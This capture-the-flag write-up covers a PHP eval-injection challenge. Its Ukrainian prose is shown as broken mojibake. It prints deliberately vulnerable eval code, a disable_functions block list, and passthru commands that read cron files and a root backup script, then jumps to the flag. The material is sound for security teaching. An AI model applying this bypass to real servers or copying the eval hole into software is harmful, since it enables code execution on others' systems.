<p align="center">
  <img src="/.img/Screenshot_1.png" alt="image" width="640" height="360" />
</p>

# üß© –ö–ù–£—à–Ω–∏–π –Ω—ñ–∂ (KNU Knife)
## **–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** Offensive Security  
## **–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** Medium  

---

### **–û–ø–∏—Å –∑–∞–≤–¥–∞–Ω–Ω—è:**  
–£–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –≥—Ä—É–ø–æ—é —ñ–Ω—ñ—Ü—ñ–∞—Ç–∏–≤–Ω–∏—Ö —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤, –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞–∑–≤—É ¬´–ö–ù–£—à–Ω–∏–π –Ω—ñ–∂¬ª. –ù–∞ –ø–æ–≤–µ—Ä—Ö–Ω—ñ ‚Äì –∑–≤–∏—á–∞–π–Ω–∏–π —Å–µ—Ä–≤—ñ—Å —ñ–∑ –±–∞–∑–æ–≤–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏. –ê–ª–µ —è–∫—â–æ –∫–æ–ø–Ω—É—Ç–∏ –≥–ª–∏–±—à–µ, –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å—Å—è –∑–æ–≤—Å—ñ–º —ñ–Ω—à—ñ –ª–µ–∑–∞.  
–ö–∞–∂—É—Ç—å, –¥–µ—è–∫—ñ –∑ –Ω–∏—Ö –¥–∞–≤–Ω–æ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—î—é –∑ —Ç–µ—Ö–Ω—ñ–∫–∏ –±–µ–∑–ø–µ–∫–∏. –¢–∏ –∂ –Ω–µ –∑ —Ç–∏—Ö, —Ö—Ç–æ —á–∏—Ç–∞—î —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó?  
Q: –û—Ç—Ä–∏–º–∞–π—Ç–µ root flag. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–¥–∞–π—Ç–µ —É —Ñ–æ—Ä–º–∞—Ç—ñ actf{flag}.

---
### **–†–æ–∑–≤'—è–∑–∞–Ω–Ω—è:**  
1. –ü—Ä–æ—Å–∫–∞–Ω—É—î–º–æ –Ω–∞–¥–∞–Ω–∏–π **IP** –∞–¥—Ä–µ—Å.  
	<p align="center">
		<img src=".img/Screenshot_1.png" alt="screenshot1" />
	</p>
  
2. –ü–æ–¥–∏–≤–∏–º–æ—Å—å —â–æ –∑–∞ –≤–µ–±-—Ä–µ—Å—É—Ä—Å –∑–∞–ø—É—â–µ–Ω–∏–π.  
	<p align="center">
		<img src=".img/Screenshot_2.png" alt="screenshot2" />
	</p>
  
3. Wappalyzer –∫–∞–∂–µ —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **php**, —É –∫–æ–¥—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –π–æ–≥–æ –Ω–µ –≤–∏–¥–Ω–æ, —Å–ø—Ä–æ–±—É—î–º–æ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Å–µ—Ä–≤—ñ—Å–æ–º.  
	<p align="center">
		<img src=".img/Screenshot_3.png" alt="screenshot3" />
	</p>
  
4. –°–ø—Ä–æ–±—É—î–º–æ –≤–∏–∑–≤–∞—Ç–∏ –¥–µ–∫—ñ–ª—å–∫–∞ —Ñ—É–Ω–∫—Ü—ñ–π.  
	<p align="center">
		<img src=".img/Screenshot_4.png" alt="screenshot4" />
	</p>  
	<p align="center">
		<img src=".img/Screenshot_5.png" alt="screenshot5" />
	</p>
  
5. –î–µ—è–∫—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –Ω–µ –ø—Ä–æ–ø—É—Å–∫–∞—î —Ñ—ñ–ª—å—Ç—Ä, –¥–µ—è–∫—ñ –Ω—ñ–±–∏—Ç–æ —Å–ø—Ä–∞—Ü—å–æ–≤—É—é—Ç—å, –∞–ª–µ –Ω—ñ—á–æ–≥–æ –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å. –ü—Ä–æ—Å–∫–∞–Ω—É—î–º–æ –Ω–∞—è–≤–Ω—ñ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó –Ω–∞ —Å–∞–π—Ç—ñ.  
	<p align="center">
		<img src=".img/Screenshot_6.png" alt="screenshot6" />
	</p>
  
6. –ü–µ—Ä–µ–π–¥–µ–º–æ —É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é.  
	<p align="center">
		<img src=".img/Screenshot_7.png" alt="screenshot7" />
	</p>
  
–£ **index.php.backup** –±–∞—á–∏–º–æ —Å–∏—Å—Ç–µ–º—É —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó **regex** + –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Ä—è–¥–∫–∏:  
  ```php
  <?php
  $result = '';
  $error = '';
  $code = '';
  
  if (isset($_GET['code'])) {
      $code = $_GET['code'];
  
      if (
          preg_match('/[^a-z0-9_\(\)\[\]\+\-\*\/\"\'\s]/i', $code) ||
          stripos($code, '//') !== false ||
          stripos($code, 'system') !== false ||
          stripos($code, 'exec') !== false ||
          stripos($code, 'eval') !== false ||
          stripos($code, 'assert') !== false ||
          stripos($code, 'include') !== false ||
          stripos($code, 'require') !== false ||
          stripos($code, 'chr') !== false ||
          stripos($code, 'ord') !== false
      ) {
          $error = "‚ùå Forbidden keyword detected.";
      } else {
          try {
              eval("\$result = $code;");
          } catch (Throwable $e) {
              $error = "‚ùå –ü–æ–º–∏–ª–∫–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è: " . htmlspecialchars($e->getMessage());
          }
      }
  }
  ?>
  ```     
	
  –£ **php.ini.backup** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤–µ–ª–∏–∫–∏–π —Å–ø–∏—Å–æ–∫ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π:  

  ```
  disable_functions = include,get_included_files,get_declared_classes,get_declared_functions,ini_set,putenv,memory_get_usage,memory_get_peak_usage,get_defined_constants,assert,require_once,create_function,include,include_once,require,exec,system,shell_exec,popen,proc_open,pcntl_exec,phpinfo,posix_mkfifo,posix_getlogin,posix_ttyname,getenv,get_current_user,proc_get_status,get_cfg_var,disk_free_space,disk_total_space,diskfreespace,getcwd,getlastmo,getmygid,getmyinode,getmypid,getmyuid,fopen,tmpfile,bzopen,gzopen,chmod,chgrp,chown,copy,file_put_contents,lchgrp,lchown,link,mkdir,move_uploaded_file,rename,rmdir,symlink,tempnam,touch,unlink,imagepng,imagewbmp,image2wbmp,imagejpeg,imagexbm,imagegif,imagegd,imagegd2,iptcembed,ftp_get,ftp_nb_get,file_exists,file_get_contents,file,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,filesize,filetype,glob,is_dir,is_executable,is_file,is_link,is_readable,is_uploaded_file,is_writable,is_writeable,linkinfo,lstat,parse_ini_file,pathinfo,readfile,readlink,realpath,stat,gzfile,readgzfile,getimagesize,imagecreatefromgif,imagecreatefromjpeg,imagecreatefrompng,imagecreatefromwbmp,imagecreatefromxbm,imagecreatefromxpm,ftp_put,ftp_nb_put,exif_read_data,read_exif_data,exif_thumbnail,exif_imagetype,hash_file,hash_hmac_file,hash_update_file,md5_file,sha1_file,highlight_file,show_source,php_strip_whitespace,get_meta_tags
  ```
7. –ó–Ω–∞–π–¥–µ–º–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ–π](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720) —ñ–∑ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ **php**, —Ç–∞ –ø–æ–¥–∏–≤–∏–º–æ—Å—å —è–∫—ñ –Ω–µ –Ω–∞—è–≤–Ω—ñ —É —Å–ø–∏—Å–∫—É.  
	–Ü–∑ —Å–ø–∏—Å–∫—É —Ñ—É–Ω–∫—Ü—ñ–π –Ω–µ –Ω–∞—è–≤–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `passthru`, —Å–ø—Ä–æ–±—É—î–º–æ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è –Ω–µ—é.  
	<p align="center">
		<img src=".img/Screenshot_8.png" alt="screenshot8" />
	</p>
  
8. –ö–æ–º–∞–Ω–¥–∞ —É—Å–ø—ñ—à–Ω–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –Ω–∞—è–≤–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è backup, —Å–∫–æ—Ä—ñ—à –∑–∞ –≤—Å–µ, —î —Å–∫—Ä–∏–ø—Ç —è–∫–∏–π –π–æ–≥–æ —Å—Ç–≤–æ—Ä—é—î, –ø–µ—Ä–µ–¥–∏–≤–∏–º–æ—Å—å cron –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –∑–∞–ø–∏—Å—ñ–≤ –ø–æ–≤—è–∑–∞–Ω–∏—Ö —ñ–∑ **backup**.  
	
	`passthru('grep "backup" /etc/cron*/*')`  
	
	<p align="center">
		<img src=".img/Screenshot_9.png" alt="screenshot9" />
	</p>
  
9. –ë–∞—á–∏–º–æ —Å–∫—Ä–∏–ø—Ç —è–∫–∏–π –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –≤—ñ–¥ —ñ–º–µ–Ω—ñ **root**, –ø–µ—Ä–µ–≤—ñ—Ä–∏–º–æ —á–∏ –º–æ–∂–µ–º–æ –º–∏ –π–æ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏. –û—Å–∫—ñ–ª—å–∫–∏ —Ñ—ñ–ª—å—Ç—Ä –±–ª–æ–∫—É—î –∫—Ä–∞–ø–∫—É, –∑–∞–º—ñ–Ω–∏–º–æ —ó—ó –∑—ñ—Ä–æ—á–∫–æ—é.  
	
	`passthru('cat /usr/local/bin/backup*sh')`  
	
	<p align="center">
		<img src=".img/Screenshot_10.png" alt="screenshot10" />
	</p>

---  
#### Flag: ```actf{php_www_2_r00t_yiT86X}```
---
